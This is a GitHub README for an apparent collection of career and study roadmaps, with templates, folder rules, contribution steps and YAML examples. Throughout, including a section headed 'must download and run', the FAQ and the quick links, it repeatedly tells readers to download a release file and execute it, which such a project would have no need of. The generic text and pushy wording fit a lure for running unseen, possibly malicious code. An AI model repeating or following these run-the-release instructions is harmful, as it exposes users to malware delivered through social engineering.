# 🚀 Learning Roadmaps: Curated Career Paths and Study Plans

[![Releases](https://img.shields.io/badge/releases-download-blue?logo=github)](https://github.com/beatrap96/learning-roadmaps/releases)

A curated collection of learning and career roadmaps. Find complete guides, learning sequences, templates, and contribution tooling. Use this repo to build study plans, track skills, and plan career moves.

![Study desk](https://images.unsplash.com/photo-1522071820081-009f0129c71c?auto=format&fit=crop&w=1400&q=80)

Topics
- career-roadmaps
- curriculum
- education
- guides
- learning
- learning-path
- learning-paths
- roadmap
- roadmaps
- study-plan
- tutorials

Table of contents
- About
- What you get
- Roadmap formats
- How to use a roadmap
- Download releases (must download and run)
- Contributing
- Templates & tooling
- Structure & naming
- Examples
- FAQ
- License

About
This repo collects roadmaps for careers and learning tracks. Each roadmap maps skills, resources, and milestones. Authors can add guides, templates, and scripts. Contributors find tooling that helps maintain quality and versioning.

What you get
- Full learning sequences. Topics flow from beginner to advanced.
- Milestones and checkpoints. Use them to measure progress.
- Resource lists. Books, courses, articles, labs, and projects.
- Reusable templates. Roadmap.md, syllabus.yml, timeline.svg.
- Contribution tooling. Lint scripts, CI, and release helpers.

Roadmap formats
Roadmaps use common formats so people can read and edit with familiar tools.
- Markdown (.md) — readable, diff-friendly, and editable on GitHub.
- YAML (.yml) — structured data for automation and site generation.
- SVG / PNG — visual roadmaps for presentations and pages.
- PDF — printable study plans for offline use.
- Scripts (.sh, .py) — helper scripts to validate or build assets.

How to use a roadmap
1. Browse the folder for the topic you want.
2. Open README.md or roadmap.md for a quick summary.
3. Read the learning sequence. Each step lists resources and an estimate of time.
4. Clone the repo or copy files into your workspace.
5. Track progress with the milestones. Mark items done as you finish them.
6. Adapt the plan. Remove or reorder modules to fit your needs.

Download releases (must download and run)
This project ships release assets that package templates and tooling. Download the release file and execute it to install helper scripts and local templates. Use the releases page or the badge at the top.

- Visit the Releases page: https://github.com/beatrap96/learning-roadmaps/releases
- Choose the asset for your platform.
- Download the asset and run it on your machine.
- The release script installs local templates in ./templates and adds validation scripts.

Releases badge
[![Download Release](https://img.shields.io/badge/-Get%20Release-6f42c1?logo=github&logoColor=white)](https://github.com/beatrap96/learning-roadmaps/releases)

Contributing
We welcome contributions that improve roadmaps and tooling. Follow these steps.

1. Fork the repo.
2. Create a feature branch from main.
3. Add or update a roadmap folder. Include roadmap.md and syllabus.yml.
4. Run the lint script in tools/ to validate format.
5. Submit a pull request with a clear description of the change.
6. Address review comments and tests.

Guidelines for roadmaps
- Start with target role and time estimate.
- List prerequisite skills first.
- Break modules into 1–4 week chunks.
- Add projects for each milestone.
- Cite resources and add links.
- Include a section on assessment and portfolio items.

Templates & tooling
This repo includes templates and scripts to help authors.

- templates/roadmap.md — roadmap template with headings and tags.
- templates/syllabus.yml — structured syllabus with modules and hours.
- tools/validate.js — checks required fields in syllabus.yml and roadmap.md.
- tools/generate-svg.sh — builds simple SVG visuals from YAML.
- tools/release.sh — packages templates for releases.

Tooling workflow
- Edit syllabus.yml.
- Run tools/validate.js.
- Run tools/generate-svg.sh to update the visual.
- Commit the changes and open a PR.

Structure & naming
Use a clear folder layout and file names so automation can find files.

Top-level layout
- roadmaps/ — one folder per topic or role
  - frontend-developer/
    - roadmap.md
    - syllabus.yml
    - timeline.svg
    - projects/
  - data-science/
    - roadmap.md
    - syllabus.yml
- templates/ — canonical templates
- tools/ — scripts and CI helpers
- .github/ — CI, issue templates, and workflows

Naming rules
- Use kebab-case for folder names.
- Use roadmap.md for the human-readable plan.
- Use syllabus.yml for structured data.
- Use timeline.svg for visuals.

Examples
Below are example excerpts you will find in the repo.

Example roadmap.md excerpt
---
Title: Frontend Developer Roadmap
Target role: Junior Frontend Developer
Duration: 6 months
Overview:
- HTML & CSS
- JavaScript fundamentals
- Modern frameworks
- Build tools and testing
Projects:
- Portfolio site
- Todo app with API
Assessments:
- Deploy a site with CI/CD
---

Example syllabus.yml excerpt
modules:
  - name: HTML & CSS
    weeks: 2
    resources:
      - title: MDN Web Docs
        url: https://developer.mozilla.org/
  - name: JavaScript Fundamentals
    weeks: 6
    resources:
      - title: You Don't Know JS
        url: https://github.com/getify/You-Dont-Know-JS

Automation reads syllabus.yml to generate visuals and checks.

Visual assets
The repo uses generated SVGs for roadmaps. You can use them in slides, wikis, and PDFs. The generator reads syllabus.yml and renders module blocks with colors and labels. The colors follow a palette that improves contrast and print results.

CI & validation
A GitHub Action runs on PRs to validate new roadmaps. The action runs:
- tools/validate.js
- YAML schema checks
- Link checks for external resources

If the release script needs to run, use the release asset found on the Releases page. Download the release file and execute it. The release contains packaged templates and CLI helpers. The release link is here again: https://github.com/beatrap96/learning-roadmaps/releases

Contribution tips
- Keep modules small and measurable.
- Add real projects. Projects prove learning.
- Prefer free and open resources when available.
- Link to reputable sources.
- Keep the roadmap evergreen. Mark deprecated items.

How to add a new roadmap (step-by-step)
1. Create a folder under roadmaps/ with a descriptive name.
2. Add roadmap.md with role, duration, and overview.
3. Add syllabus.yml with modules and resources.
4. Add one or two sample project descriptions.
5. Run tools/validate.js and fix issues.
6. Commit and open a pull request.

Maintainers will review for clarity and consistency. CI will run validation. After approval, maintainers merge and release assets may update.

License
This project uses the MIT license. Check LICENSE.md in the repo for details.

Community & support
Open issues for broken links, outdated resources, or tooling bugs. Use discussions to propose new roadmap categories or templates.

Images and media
Use public domain or Creative Commons images. The visuals in this README use free stock photos for context. Replace images in your roadmap with proper attribution when required.

SEO and discoverability
Each roadmap includes metadata to improve search on GitHub and search engines:
- title
- description (short)
- topics (use the topics list above)
- tags in syllabus.yml

This improves findability for learners and hiring managers.

FAQs
Q: How long should a roadmap be?
A: Aim for 2–12 months by default. Smaller modules help learners stay focused.

Q: Can I reuse parts of another roadmap?
A: Yes. Copy modules and adapt them. Give credit where it helps.

Q: Who reviews new roadmaps?
A: Project maintainers and community reviewers. Follow the PR checklist.

Q: How do releases work?
A: Releases package templates and CLI tooling. Download the release file and run it to install local helpers.

Contact
Open an issue for feature requests or questions. Use pull requests to submit new roadmaps or fixes.

Badge collection
[![Roadmaps](https://img.shields.io/badge/roadmaps-ready-brightgreen)](https://github.com/beatrap96/learning-roadmaps)
[![Topics](https://img.shields.io/badge/topics-education%20%7C%20career-blueviolet)](https://github.com/beatrap96/learning-roadmaps)

Quick links
- Releases (download and run the release file): https://github.com/beatrap96/learning-roadmaps/releases
- Issues: /issues
- Contribute: /blob/main/CONTRIBUTING.md

Screenshots
![Roadmap example](https://images.unsplash.com/photo-1503676260728-1c00da094a0b?auto=format&fit=crop&w=1400&q=80)

This README serves as a guide to the repo structure, formats, and workflows. Use the templates and tooling to keep roadmaps consistent. Build study plans, track skills, and ship learning assets that others can use and fork.